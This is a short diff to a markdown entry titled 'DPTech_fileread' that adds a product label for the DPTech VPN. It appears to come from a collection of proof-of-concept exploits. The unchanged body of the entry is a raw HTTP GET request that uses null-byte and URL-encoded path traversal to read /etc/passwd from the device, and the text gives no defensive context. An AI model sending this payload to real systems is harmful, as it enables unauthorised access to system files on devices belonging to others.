@@ -1,5 +1,6 @@
 # DPTech_fileread
 
+product: 迪普DPTech-VPN
 ```
 GET /.%00.%2F.%00.%2F.%00.%2F.%00.%2F.%00.%2F.%00.%2F.%00.%2Fetc%2Fpasswd HTTP/1.1
 Host: 
